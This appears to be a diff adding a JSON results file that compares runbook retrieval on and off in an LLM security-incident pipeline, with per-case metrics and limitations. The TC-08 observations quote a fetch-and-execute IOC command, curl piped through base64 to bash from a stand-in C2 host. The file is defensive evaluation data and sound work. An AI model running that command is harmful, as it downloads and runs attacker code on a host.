@@ -1,0 +1,1076 @@
+{
+  "part": "B",
+  "title": "RAG evaluation (runbook corpus)",
+  "design": "same 10 cases, same pipeline (clean mode, no analyst correction), two conditions: A = RAG reachable but the isolated Qdrant is EMPTY (retrieval status not_found); B = the 17 ACTIVE runbooks indexed by the project's own indexer. One run per case per arm: differences are NOT attributable to RAG beyond LLM run-to-run variation.",
+  "corpus": {
+    "runbooks": 17,
+    "indexer": "apps/backend/scripts/indexRunbooksToQdrant.ts",
+    "embeddingModel": "BAAI/bge-small-en-v1.5 (384-d, cosine)",
+    "qdrant": "isolated container vigix-eval-qdrant (1.19.1) on :6335",
+    "knowledgeTypeDocuments": 0,
+    "note": "all runbooks carry sourceType PLAYBOOK; the KNOWLEDGE side of the dual retrieval has no documents by construction"
+  },
+  "groundTruthSha256": "b20824a25040ff352301ddaff25923d21674eed4bbaf5880f814b5b0b94b0b77",
+  "arms": {
+    "A_empty_corpus": {
+      "run": "ext-rag-off-20261001",
+      "startedAt": "2026-10-01T05:41:02.908Z",
+      "finishedAt": "2026-10-01T06:07:04.638Z",
+      "groundTruthSha256": "ddb18d5d4dee4ffe32730474b5a227a256ddd9c20805a83fbad4c94a81e64056",
+      "cases": [
+        {
+          "case": "TC-01",
+          "incidentId": "e5a306aa-a6f5-4064-9cab-76c64918bb16",
+          "ragStatus": "not_found",
+          "ragError": null,
+          "retrieved": [],
+          "scores": [],
+          "primary": [
+            "RB-BRUTEFORCE-001"
+          ],
+          "relevant": [
+            "RB-BLOCK-SOURCE-IP",
+            "RB-DISABLE-ACCOUNT"
+          ],
+          "retrieval": null,
+          "compliance": "COMPLIANT",
+          "playbook": "PB-SSH-BRUTEFORCE",
+          "retries": 0,
+          "workflowCompleted": true,
+          "verification": "RESOLVED",
+          "verificationMode": "REAL_WAZUH",
+          "investigationSeconds": 66,
+          "interventions": 0,
+          "ipSteps": [
+            {
+              "action": "ACT-BLOCK-SOURCE-IP",
+              "target": "172.19.0.6",
+              "correctRole": true
+            }
+          ],
+          "observations": [],
+          "finalResult": "PASS"
+        },
+        {
+          "case": "TC-02",
+          "incidentId": "6968dc6b-8b03-4ad6-8503-904c84a47718",
+          "ragStatus": "not_found",
+          "ragError": null,
+          "retrieved": [],
+          "scores": [],
+          "primary": [
+            "RB-MALWARE-001"
+          ],
+          "relevant": [
+            "RB-QUARANTINE-FILE",
+            "RB-BLOCK-HASH",
+            "RB-ISOLATE-ENDPOINT"
+          ],
+          "retrieval": null,
+          "compliance": "NOT_EVALUATED",
+          "playbook": null,
+          "retries": 6,
+          "workflowCompleted": false,
+          "verification": null,
+          "verificationMode": "NONE",
+          "investigationSeconds": null,
+          "interventions": 0,
+          "ipSteps": [],
+          "observations": [
+            "EXPECTED_IOC_MISSING (before any correction): hash:275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f, file:/root/Downloads/Invoice_Q4_2026.xls.ex",
+            "NO_VALID_RECOMMENDATION after 5 model attempts"
+          ],
+          "finalResult": "FAIL"
+        },
+        {
+          "case": "TC-03",
+          "incidentId": "847b4ac3-8833-48dc-beba-9da84dd1b4bd",
+          "ragStatus": "not_found",
+          "ragError": null,
+          "retrieved": [],
+          "scores": [],
+          "primary": [
+            "RB-PHISHING-001"
+          ],
+          "relevant": [
+            "RB-QUARANTINE-EMAIL",
+            "RB-BLOCK-URL",
+            "RB-BLOCK-DOMAIN"
+          ],
+          "retrieval": null,
+          "compliance": "NOT_EVALUATED",
+          "playbook": null,
+          "retries": 5,
+          "workflowCompleted": false,
+          "verification": null,
+          "verificationMode": "NONE",
+          "investigationSeconds": null,
+          "interventions": 0,
+          "ipSteps": [],
+          "observations": [
+            "NO_VALID_RECOMMENDATION after 5 model attempts"
+          ],
+          "finalResult": "FAIL"
+        },
+        {
+          "case": "TC-04",
+          "incidentId": "cf8ed1c6-86ee-43e1-9fb4-7b69f4d4ae5c",
+          "ragStatus": "not_found",
+          "ragError": null,
+          "retrieved": [],
+          "scores": [],
+          "primary": [
+            "RB-DISABLE-ACCOUNT"
+          ],
+          "relevant": [
+            "RB-RESET-CREDENTIAL",
+            "RB-REVOKE-SESSION",
+            "RB-BLOCK-SOURCE-IP"
+          ],
+          "retrieval": null,
+          "compliance": "COMPLIANT",
+          "playbook": "PB-ACCOUNT-COMPROMISE",
+          "retries": 0,
+          "workflowCompleted": true,
+          "verification": "RESOLVED",
+          "verificationMode": "REAL_WAZUH",
+          "investigationSeconds": 65.42,
+          "interventions": 0,
+          "ipSteps": [
+            {
+              "action": "ACT-BLOCK-SOURCE-IP",
+              "target": "172.19.0.6",
+              "correctRole": true
+            }
+          ],
+          "observations": [],
+          "finalResult": "PASS"
+        },
+        {
+          "case": "TC-05",
+          "finalResult": "ENVIRONMENT_UNAVAILABLE"
+        },
+        {
+          "case": "TC-06",
+          "incidentId": "4a208ad8-1c45-4bc8-887b-a2187823b3a2",
+          "ragStatus": "not_found",
+          "ragError": null,
+          "retrieved": [],
+          "scores": [],
+          "primary": [
+            "RB-BLOCK-SOURCE-IP"
+          ],
+          "relevant": [],
+          "retrieval": null,
+          "compliance": "COMPLIANT",
+          "playbook": "PB-SQL-INJECTION",
+          "retries": 0,
+          "workflowCompleted": true,
+          "verification": "RESOLVED",
+          "verificationMode": "REAL_WAZUH",
+          "investigationSeconds": 56.23,
+          "interventions": 0,
+          "ipSteps": [
+            {
+              "action": "ACT-BLOCK-SOURCE-IP",
+              "target": "172.19.0.6",
+              "correctRole": true
+            }
+          ],
+          "observations": [],
+          "finalResult": "PASS"
+        },
+        {
+          "case": "TC-07",
+          "incidentId": "320c9ef2-c414-4293-81f3-31855aa219ce",
+          "ragStatus": "not_found",
+          "ragError": null,
+          "retrieved": [],
+          "scores": [],
+          "primary": [
+            "RB-C2-CONTAINMENT",
+            "RB-NETWORK-001"
+          ],
+          "relevant": [
+            "RB-BLOCK-DOMAIN",
+            "RB-BLOCK-URL",
+            "RB-ISOLATE-ENDPOINT"
+          ],
+          "retrieval": null,
+          "compliance": "COMPLIANT",
+          "playbook": "PB-C2",
+          "retries": 1,
+          "workflowCompleted": true,
+          "verification": "RESOLVED",
+          "verificationMode": "REAL_WAZUH",
+          "investigationSeconds": 168.54,
+          "interventions": 0,
+          "ipSteps": [
+            {
+              "action": "ACT-BLOCK-DESTINATION-IP",
+              "target": "172.19.0.5",
+              "correctRole": false
+            }
+          ],
+          "observations": [],
+          "finalResult": "PASS"
+        },
+        {
+          "case": "TC-08",
+          "incidentId": "9a49fab3-7c61-4cf3-93b6-646ff76c850d",
+          "ragStatus": "not_found",
+          "ragError": null,
+          "retrieved": [],
+          "scores": [],
+          "primary": [
+            "RB-KILL-MALICIOUS-PROCESS"
+          ],
+          "relevant": [
+            "RB-QUARANTINE-FILE",
+            "RB-ISOLATE-ENDPOINT"
+          ],
+          "retrieval": null,
+          "compliance": "NOT_EVALUATED",
+          "playbook": null,
+          "retries": 5,
+          "workflowCompleted": false,
+          "verification": null,
+          "verificationMode": "NONE",
+          "investigationSeconds": null,
+          "interventions": 0,
+          "ipSteps": [],
+          "observations": [
+            "EXPECTED_IOC_MISSING (before any correction): process:/tmp/.cache/kworkerd, command:curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash",
+            "NO_VALID_RECOMMENDATION after 5 model attempts"
+          ],
+          "finalResult": "FAIL"
+        },
+        {
+          "case": "TC-09",
+          "incidentId": "ec553647-73a2-494d-a9c7-6245267aaace",
+          "ragStatus": "not_found",
+          "ragError": null,
+          "retrieved": [],
+          "scores": [],
+          "primary": [
+            "RB-C2-CONTAINMENT",
+            "RB-NETWORK-001"
+          ],
+          "relevant": [
+            "RB-BLOCK-DOMAIN",
+            "RB-BLOCK-URL",
+            "RB-ISOLATE-ENDPOINT"
+          ],
+          "retrieval": null,
+          "compliance": "COMPLIANT",
+          "playbook": "PB-DATA-EXFIL",
+          "retries": 0,
+          "workflowCompleted": true,
+          "verification": "RESOLVED",
+          "verificationMode": "REAL_WAZUH",
+          "investigationSeconds": 70.3,
+          "interventions": 0,
+          "ipSteps": [
+            {
+              "action": "ACT-BLOCK-DESTINATION-IP",
+              "target": "172.19.0.5",
+              "correctRole": false
+            }
+          ],
+          "observations": [],
+          "finalResult": "PASS"
+        },
+        {
+          "case": "TC-10",
+          "incidentId": "c342572b-8166-4c46-bbe4-8cd25ccb58c6",
+          "ragStatus": "not_found",
+          "ragError": null,
+          "retrieved": [],
+          "scores": [],
+          "primary": [
+            "RB-DISABLE-ACCOUNT"
+          ],
+          "relevant": [
+            "RB-RESET-CREDENTIAL",
+            "RB-REVOKE-SESSION"
+          ],
+          "retrieval": null,
+          "compliance": "COMPLIANT",
+          "playbook": "PB-ACCOUNT-COMPROMISE",
+          "retries": 0,
+          "workflowCompleted": false,
+          "verification": null,
+          "verificationMode": "NONE",
+          "investigationSeconds": 49.49,
+          "interventions": 0,
+          "ipSteps": [],
+          "observations": [],
+          "finalResult": "INCOMPLETE"
+        }
+      ],
+      "compliance": {
+        "compliant": 6,
+        "evaluated": 6,
+        "attempted": 9
+      },
+      "noValidRecommendation": [
+        "TC-02",
+        "TC-03",
+        "TC-08"
+      ],
+      "retries": {
+        "cases": 4,
+        "total": 17,
+        "of": 9
+      },
+      "workflowCompleted": {
+        "n": 5,
+        "of": 9
+      },
+      "investigationSeconds": {
+        "n": 6,
+        "mean": 79.33,
+        "median": 65.71,
+        "sd": 44.35,
+        "min": 49.49,
+        "max": 168.54
+      },
+      "ragStatuses": {
+        "not_found": 9
+      },
+      "retrieval": "NOT CALCULABLE — no document was retrieved (empty corpus)",
+      "ipRole": {
+        "allIpSteps": {
+          "correct": 3,
+          "of": 5
+        },
+        "destinationIpSteps": {
+          "correct": 0,
+          "of": 2
+        }
+      }
+    },
+    "B_runbook_corpus": {
+      "run": "ext-rag-on-20261001",
+      "startedAt": "2026-10-01T06:07:44.912Z",
+      "finishedAt": "2026-10-01T06:31:18.879Z",
+      "groundTruthSha256": "ddb18d5d4dee4ffe32730474b5a227a256ddd9c20805a83fbad4c94a81e64056",
+      "cases": [
+        {
+          "case": "TC-01",
+          "incidentId": "536eef5b-4d49-4f01-b4c1-b7735e2eb310",
+          "ragStatus": "NOT_RECORDED",
+          "ragError": null,
+          "retrieved": [
+            "RB-BRUTEFORCE-001",
+            "RB-RESET-CREDENTIAL",
+            "RB-PHISHING-001",
+            "RB-RANSOMWARE-001",
+            "RB-QUARANTINE-EMAIL"
+          ],
+          "scores": [
+            0.67,
+            0.63,
+            0.6,
+            0.57,
+            0.57
+          ],
+          "primary": [
+            "RB-BRUTEFORCE-001"
+          ],
+          "relevant": [
+            "RB-BLOCK-SOURCE-IP",
+            "RB-DISABLE-ACCOUNT"
+          ],
+          "retrieval": {
+            "primaryHitAt1": true,
+            "primaryHitAt3": true,
+            "relevantHitAt3": true,
+            "precisionAt3": 0.33,
+            "recallAt3": 0.33,
+            "firstRelevantRank": 1,
+            "firstPrimaryRank": 1,
+            "reciprocalRank": 1
+          },
+          "compliance": "COMPLIANT",
+          "playbook": "PB-SSH-BRUTEFORCE",
+          "retries": 0,
+          "workflowCompleted": true,
+          "verification": "RESOLVED",
+          "verificationMode": "REAL_WAZUH",
+          "investigationSeconds": 57.09,
+          "interventions": 0,
+          "ipSteps": [
+            {
+              "action": "ACT-BLOCK-SOURCE-IP",
+              "target": "172.19.0.6",
+              "correctRole": true
+            }
+          ],
+          "observations": [],
+          "finalResult": "PASS"
+        },
+        {
+          "case": "TC-02",
+          "incidentId": "19213acc-7d66-48e9-af16-5c322ac0bcaf",
+          "ragStatus": "NOT_RECORDED",
+          "ragError": null,
+          "retrieved": [
+            "RB-MALWARE-001",
+            "RB-QUARANTINE-FILE",
+            "RB-RANSOMWARE-001",
+            "RB-BLOCK-URL",
+            "RB-QUARANTINE-EMAIL"
+          ],
+          "scores": [
+            0.63,
+            0.63,
+            0.62,
+            0.61,
+            0.61
+          ],
+          "primary": [
+            "RB-MALWARE-001"
+          ],
+          "relevant": [
+            "RB-QUARANTINE-FILE",
+            "RB-BLOCK-HASH",
+            "RB-ISOLATE-ENDPOINT"
+          ],
+          "retrieval": {
+            "primaryHitAt1": true,
+            "primaryHitAt3": true,
+            "relevantHitAt3": true,
+            "precisionAt3": 0.67,
+            "recallAt3": 0.5,
+            "firstRelevantRank": 1,
+            "firstPrimaryRank": 1,
+            "reciprocalRank": 1
+          },
+          "compliance": "COMPLIANT",
+          "playbook": "PB-MALWARE",
+          "retries": 0,
+          "workflowCompleted": false,
+          "verification": null,
+          "verificationMode": "NONE",
+          "investigationSeconds": 59.51,
+          "interventions": 0,
+          "ipSteps": [],
+          "observations": [
+            "EXPECTED_IOC_MISSING (before any correction): hash:275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f, file:/root/Downloads/Invoice_Q4_2026.xls.ex"
+          ],
+          "finalResult": "INCOMPLETE"
+        },
+        {
+          "case": "TC-03",
+          "incidentId": "2d14868c-7cd0-41dc-98ff-fae46e8e65e0",
+          "ragStatus": "NOT_RECORDED",
+          "ragError": null,
+          "retrieved": [
+            "RB-PHISHING-001",
+            "RB-QUARANTINE-EMAIL",
+            "RB-RESET-CREDENTIAL",
+            "RB-BLOCK-URL",
+            "RB-MALWARE-001"
+          ],
+          "scores": [
+            0.73,
+            0.69,
+            0.68,
+            0.65,
+            0.64
+          ],
+          "primary": [
+            "RB-PHISHING-001"
+          ],
+          "relevant": [
+            "RB-QUARANTINE-EMAIL",
+            "RB-BLOCK-URL",
+            "RB-BLOCK-DOMAIN"
+          ],
+          "retrieval": {
+            "primaryHitAt1": true,
+            "primaryHitAt3": true,
+            "relevantHitAt3": true,
+            "precisionAt3": 0.67,
+            "recallAt3": 0.5,
+            "firstRelevantRank": 1,
+            "firstPrimaryRank": 1,
+            "reciprocalRank": 1
+          },
+          "compliance": "NOT_EVALUATED",
+          "playbook": null,
+          "retries": 5,
+          "workflowCompleted": false,
+          "verification": null,
+          "verificationMode": "NONE",
+          "investigationSeconds": null,
+          "interventions": 0,
+          "ipSteps": [],
+          "observations": [
+            "NO_VALID_RECOMMENDATION after 5 model attempts"
+          ],
+          "finalResult": "FAIL"
+        },
+        {
+          "case": "TC-04",
+          "incidentId": "0a8984c4-2694-4f53-9345-ecaab14f533e",
+          "ragStatus": "NOT_RECORDED",
+          "ragError": null,
+          "retrieved": [
+            "RB-BRUTEFORCE-001",
+            "RB-RESET-CREDENTIAL",
+            "RB-PHISHING-001",
+            "RB-QUARANTINE-EMAIL",
+            "RB-BLOCK-DOMAIN"
+          ],
+          "scores": [
+            0.72,
+            0.68,
+            0.64,
+            0.63,
+            0.62
+          ],
+          "primary": [
+            "RB-DISABLE-ACCOUNT"
+          ],
+          "relevant": [
+            "RB-RESET-CREDENTIAL",
+            "RB-REVOKE-SESSION",
+            "RB-BLOCK-SOURCE-IP"
+          ],
+          "retrieval": {
+            "primaryHitAt1": false,
+            "primaryHitAt3": false,
+            "relevantHitAt3": true,
+            "precisionAt3": 0.33,
+            "recallAt3": 0.25,
+            "firstRelevantRank": 2,
+            "firstPrimaryRank": null,
+            "reciprocalRank": 0.5
+          },
+          "compliance": "COMPLIANT",
+          "playbook": "PB-ACCOUNT-COMPROMISE",
+          "retries": 0,
+          "workflowCompleted": true,
+          "verification": "RESOLVED",
+          "verificationMode": "REAL_WAZUH",
+          "investigationSeconds": 126.81,
+          "interventions": 0,
+          "ipSteps": [
+            {
+              "action": "ACT-BLOCK-SOURCE-IP",
+              "target": "172.19.0.6",
+              "correctRole": true
+            }
+          ],
+          "observations": [],
+          "finalResult": "PASS"
+        },
+        {
+          "case": "TC-05",
+          "finalResult": "ENVIRONMENT_UNAVAILABLE"
+        },
+        {
+          "case": "TC-06",
+          "incidentId": "df5ee60f-4bad-43b0-afe0-524d7620eaea",
+          "ragStatus": "NOT_RECORDED",
+          "ragError": null,
+          "retrieved": [
+            "RB-BLOCK-URL",
+            "RB-BRUTEFORCE-001",
+            "RB-BLOCK-DOMAIN",
+            "RB-PHISHING-001",
+            "RB-QUARANTINE-EMAIL"
+          ],
+          "scores": [
+            0.62,
+            0.6,
+            0.6,
+            0.6,
+            0.6
+          ],
+          "primary": [
+            "RB-BLOCK-SOURCE-IP"
+          ],
+          "relevant": [],
+          "retrieval": {
+            "primaryHitAt1": false,
+            "primaryHitAt3": false,
+            "relevantHitAt3": false,
+            "precisionAt3": 0,
+            "recallAt3": 0,
+            "firstRelevantRank": null,
+            "firstPrimaryRank": null,
+            "reciprocalRank": 0
+          },
+          "compliance": "COMPLIANT",
+          "playbook": "PB-SQL-INJECTION",
+          "retries": 0,
+          "workflowCompleted": true,
+          "verification": "RESOLVED",
+          "verificationMode": "REAL_WAZUH",
+          "investigationSeconds": 60.04,
+          "interventions": 0,
+          "ipSteps": [
+            {
+              "action": "ACT-BLOCK-SOURCE-IP",
+              "target": "172.19.0.6",
+              "correctRole": true
+            }
+          ],
+          "observations": [],
+          "finalResult": "PASS"
+        },
+        {
+          "case": "TC-07",
+          "incidentId": "d08e240d-a553-46bb-a76c-d479313989b4",
+          "ragStatus": "NOT_RECORDED",
+          "ragError": null,
+          "retrieved": [
+            "RB-C2-CONTAINMENT",
+            "RB-ISOLATE-ENDPOINT",
+            "RB-BLOCK-DOMAIN",
+            "RB-NETWORK-001",
+            "RB-BLOCK-URL"
+          ],
+          "scores": [
+            0.72,
+            0.67,
+            0.67,
+            0.66,
+            0.66
+          ],
+          "primary": [
+            "RB-C2-CONTAINMENT",
+            "RB-NETWORK-001"
+          ],
+          "relevant": [
+            "RB-BLOCK-DOMAIN",
+            "RB-BLOCK-URL",
+            "RB-ISOLATE-ENDPOINT"
+          ],
+          "retrieval": {
+            "primaryHitAt1": true,
+            "primaryHitAt3": true,
+            "relevantHitAt3": true,
+            "precisionAt3": 1,
+            "recallAt3": 0.6,
+            "firstRelevantRank": 1,
+            "firstPrimaryRank": 1,
+            "reciprocalRank": 1
+          },
+          "compliance": "COMPLIANT",
+          "playbook": "PB-C2",
+          "retries": 0,
+          "workflowCompleted": true,
+          "verification": "RESOLVED",
+          "verificationMode": "REAL_WAZUH",
+          "investigationSeconds": 85.11,
+          "interventions": 0,
+          "ipSteps": [
+            {
+              "action": "ACT-BLOCK-DESTINATION-IP",
+              "target": "172.19.0.7",
+              "correctRole": true
+            }
+          ],
+          "observations": [],
+          "finalResult": "PASS"
+        },
+        {
+          "case": "TC-08",
+          "incidentId": "64472667-407d-4e39-9b82-9ff700765b22",
+          "ragStatus": "NOT_RECORDED",
+          "ragError": null,
+          "retrieved": [
+            "RB-KILL-MALICIOUS-PROCESS",
+            "RB-BLOCK-URL",
+            "RB-MALWARE-001",
+            "RB-QUARANTINE-FILE",
+            "RB-ISOLATE-ENDPOINT"
+          ],
+          "scores": [
+            0.71,
+            0.7,
+            0.7,
+            0.69,
+            0.69
+          ],
+          "primary": [
+            "RB-KILL-MALICIOUS-PROCESS"
+          ],
+          "relevant": [
+            "RB-QUARANTINE-FILE",
+            "RB-ISOLATE-ENDPOINT"
+          ],
+          "retrieval": {
+            "primaryHitAt1": true,
+            "primaryHitAt3": true,
+            "relevantHitAt3": true,
+            "precisionAt3": 0.33,
+            "recallAt3": 0.33,
+            "firstRelevantRank": 1,
+            "firstPrimaryRank": 1,
+            "reciprocalRank": 1
+          },
+          "compliance": "NOT_EVALUATED",
+          "playbook": null,
+          "retries": 5,
+          "workflowCompleted": false,
+          "verification": null,
+          "verificationMode": "NONE",
+          "investigationSeconds": null,
+          "interventions": 0,
+          "ipSteps": [],
+          "observations": [
+            "EXPECTED_IOC_MISSING (before any correction): process:/tmp/.cache/kworkerd, command:curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash",
+            "NO_VALID_RECOMMENDATION after 5 model attempts"
+          ],
+          "finalResult": "FAIL"
+        },
+        {
+          "case": "TC-09",
+          "incidentId": "db575272-b491-40aa-9ac5-b639e3cd4c3b",
+          "ragStatus": "NOT_RECORDED",
+          "ragError": null,
+          "retrieved": [
+            "RB-C2-CONTAINMENT",
+            "RB-BLOCK-URL",
+            "RB-ISOLATE-ENDPOINT",
+            "RB-BLOCK-DOMAIN",
+            "RB-MALWARE-001"
+          ],
+          "scores": [
+            0.69,
+            0.66,
+            0.66,
+            0.65,
+            0.63
+          ],
+          "primary": [
+            "RB-C2-CONTAINMENT",
+            "RB-NETWORK-001"
+          ],
+          "relevant": [
+            "RB-BLOCK-DOMAIN",
+            "RB-BLOCK-URL",
+            "RB-ISOLATE-ENDPOINT"
+          ],
+          "retrieval": {
+            "primaryHitAt1": true,
+            "primaryHitAt3": true,
+            "relevantHitAt3": true,
+            "precisionAt3": 1,
+            "recallAt3": 0.6,
+            "firstRelevantRank": 1,
+            "firstPrimaryRank": 1,
+            "reciprocalRank": 1
+          },
+          "compliance": "COMPLIANT",
+          "playbook": "PB-DATA-EXFIL",
+          "retries": 0,
+          "workflowCompleted": true,
+          "verification": "RESOLVED",
+          "verificationMode": "REAL_WAZUH",
+          "investigationSeconds": 58.13,
+          "interventions": 0,
+          "ipSteps": [
+            {
+              "action": "ACT-BLOCK-DESTINATION-IP",
+              "target": "172.19.0.7",
+              "correctRole": true
+            }
+          ],
+          "observations": [],
+          "finalResult": "PASS"
+        },
+        {
+          "case": "TC-10",
+          "incidentId": "5fc3c577-b124-4a86-89c2-a5d827c7425f",
+          "ragStatus": "NOT_RECORDED",
+          "ragError": null,
+          "retrieved": [
+            "RB-MALWARE-001",
+            "RB-BLOCK-URL",
+            "RB-RESET-CREDENTIAL",
+            "RB-ISOLATE-ENDPOINT",
+            "RB-BLOCK-DOMAIN"
+          ],
+          "scores": [
+            0.61,
+            0.6,
+            0.6,
+            0.59,
+            0.59
+          ],
+          "primary": [
+            "RB-DISABLE-ACCOUNT"
+          ],
+          "relevant": [
+            "RB-RESET-CREDENTIAL",
+            "RB-REVOKE-SESSION"
+          ],
+          "retrieval": {
+            "primaryHitAt1": false,
+            "primaryHitAt3": false,
+            "relevantHitAt3": true,
+            "precisionAt3": 0.33,
+            "recallAt3": 0.33,
+            "firstRelevantRank": 3,
+            "firstPrimaryRank": null,
+            "reciprocalRank": 0.33
+          },
+          "compliance": "COMPLIANT",
+          "playbook": "PB-ACCOUNT-COMPROMISE",
+          "retries": 0,
+          "workflowCompleted": false,
+          "verification": null,
+          "verificationMode": "NONE",
+          "investigationSeconds": 63.17,
+          "interventions": 0,
+          "ipSteps": [],
+          "observations": [],
+          "finalResult": "INCOMPLETE"
+        }
+      ],
+      "compliance": {
+        "compliant": 7,
+        "evaluated": 7,
+        "attempted": 9
+      },
+      "noValidRecommendation": [
+        "TC-03",
+        "TC-08"
+      ],
+      "retries": {
+        "cases": 2,
+        "total": 10,
+        "of": 9
+      },
+      "workflowCompleted": {
+        "n": 5,
+        "of": 9
+      },
+      "investigationSeconds": {
+        "n": 7,
+        "mean": 72.84,
+        "median": 60.04,
+        "sd": 25.7,
+        "min": 57.09,
+        "max": 126.81
+      },
+      "ragStatuses": {
+        "NOT_RECORDED": 9
+      },
+      "retrieval": {
+        "casesWithRetrieval": 9,
+        "primaryHitAt1": {
+          "n": 6,
+          "of": 9
+        },
+        "primaryHitAt3": {
+          "n": 6,
+          "of": 9
+        },
+        "relevantHitAt3": {
+          "n": 8,
+          "of": 9
+        },
+        "precisionAt3": {
+          "n": 9,
+          "mean": 0.52,
+          "median": 0.33,
+          "sd": 0.34,
+          "min": 0,
+          "max": 1
+        },
+        "recallAt3": {
+          "n": 9,
+          "mean": 0.38,
+          "median": 0.33,
+          "sd": 0.19,
+          "min": 0,
+          "max": 0.6
+        },
+        "mrr": {
+          "n": 9,
+          "mean": 0.76,
+          "median": 1,
+          "sd": 0.38,
+          "min": 0,
+          "max": 1
+        }
+      },
+      "ipRole": {
+        "allIpSteps": {
+          "correct": 5,
+          "of": 5
+        },
+        "destinationIpSteps": {
+          "correct": 2,
+          "of": 2
+        }
+      }
+    }
+  },
+  "paired": [
+    {
+      "case": "TC-01",
+      "A": {
+        "compliance": "COMPLIANT",
+        "retries": 0,
+        "workflow": true,
+        "playbook": "PB-SSH-BRUTEFORCE"
+      },
+      "B": {
+        "compliance": "COMPLIANT",
+        "retries": 0,
+        "workflow": true,
+        "playbook": "PB-SSH-BRUTEFORCE"
+      },
+      "complianceChanged": false
+    },
+    {
+      "case": "TC-02",
+      "A": {
+        "compliance": "NOT_EVALUATED",
+        "retries": 6,
+        "workflow": false,
+        "playbook": null
+      },
+      "B": {
+        "compliance": "COMPLIANT",
+        "retries": 0,
+        "workflow": false,
+        "playbook": "PB-MALWARE"
+      },
+      "complianceChanged": true
+    },
+    {
+      "case": "TC-03",
+      "A": {
+        "compliance": "NOT_EVALUATED",
+        "retries": 5,
+        "workflow": false,
+        "playbook": null
+      },
+      "B": {
+        "compliance": "NOT_EVALUATED",
+        "retries": 5,
+        "workflow": false,
+        "playbook": null
+      },
+      "complianceChanged": false
+    },
+    {
+      "case": "TC-04",
+      "A": {
+        "compliance": "COMPLIANT",
+        "retries": 0,
+        "workflow": true,
+        "playbook": "PB-ACCOUNT-COMPROMISE"
+      },
+      "B": {
+        "compliance": "COMPLIANT",
+        "retries": 0,
+        "workflow": true,
+        "playbook": "PB-ACCOUNT-COMPROMISE"
+      },
+      "complianceChanged": false
+    },
+    {
+      "case": "TC-05",
+      "A": {},
+      "B": {},
+      "complianceChanged": false
+    },
+    {
+      "case": "TC-06",
+      "A": {
+        "compliance": "COMPLIANT",
+        "retries": 0,
+        "workflow": true,
+        "playbook": "PB-SQL-INJECTION"
+      },
+      "B": {
+        "compliance": "COMPLIANT",
+        "retries": 0,
+        "workflow": true,
+        "playbook": "PB-SQL-INJECTION"
+      },
+      "complianceChanged": false
+    },
+    {
+      "case": "TC-07",
+      "A": {
+        "compliance": "COMPLIANT",
+        "retries": 1,
+        "workflow": true,
+        "playbook": "PB-C2"
+      },
+      "B": {
+        "compliance": "COMPLIANT",
+        "retries": 0,
+        "workflow": true,
+        "playbook": "PB-C2"
+      },
+      "complianceChanged": false
+    },
+    {
+      "case": "TC-08",
+      "A": {
+        "compliance": "NOT_EVALUATED",
+        "retries": 5,
+        "workflow": false,
+        "playbook": null
+      },
+      "B": {
+        "compliance": "NOT_EVALUATED",
+        "retries": 5,
+        "workflow": false,
+        "playbook": null
+      },
+      "complianceChanged": false
+    },
+    {
+      "case": "TC-09",
+      "A": {
+        "compliance": "COMPLIANT",
+        "retries": 0,
+        "workflow": true,
+        "playbook": "PB-DATA-EXFIL"
+      },
+      "B": {
+        "compliance": "COMPLIANT",
+        "retries": 0,
+        "workflow": true,
+        "playbook": "PB-DATA-EXFIL"
+      },
+      "complianceChanged": false
+    },
+    {
+      "case": "TC-10",
+      "A": {
+        "compliance": "COMPLIANT",
+        "retries": 0,
+        "workflow": false,
+        "playbook": "PB-ACCOUNT-COMPROMISE"
+      },
+      "B": {
+        "compliance": "COMPLIANT",
+        "retries": 0,
+        "workflow": false,
+        "playbook": "PB-ACCOUNT-COMPROMISE"
+      },
+      "complianceChanged": false
+    }
+  ],
+  "searchRequestsLogged": 100,
+  "limitations": [
+    "Relevance labels are the author's (frozen before retrieval) and the corpus has only 17 short runbooks; Hit@3 on 17 documents is easy.",
+    "n = 9 cases; one run per arm; no statistical test is reported.",
+    "The recommendation prompt also receives runbook text (PLAYBOOK top-3) — the effect on the recommendation cannot be separated from LLM variance.",
+    "TC-05 ENVIRONMENT_UNAVAILABLE in this part."
+  ]
+}
